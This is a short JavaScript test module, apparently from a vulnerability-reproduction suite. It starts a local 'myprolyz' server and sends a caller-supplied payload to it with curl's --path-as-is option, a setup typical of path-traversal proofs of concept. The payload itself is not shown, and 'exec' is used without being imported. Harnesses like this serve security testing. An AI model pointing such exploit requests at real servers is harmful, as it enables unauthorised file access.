function exploitFunction(payload) {
  const { execSync } = require("child_process");
  const { sleep } = require("sleep");

  afterAll(() => {
    try {
      execSync("fuser -k 8889/tcp");
    } catch (e) {}
  });

  const server = "node ./node_modules/myprolyz/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8889${payload}"`;
  try {
    const result = execSync(attack_string);
    return result.toString();
  } catch (error) {
    throw new Error("Failed to execute the command or no output received");
  }
}

module.exports = { exploitFunction };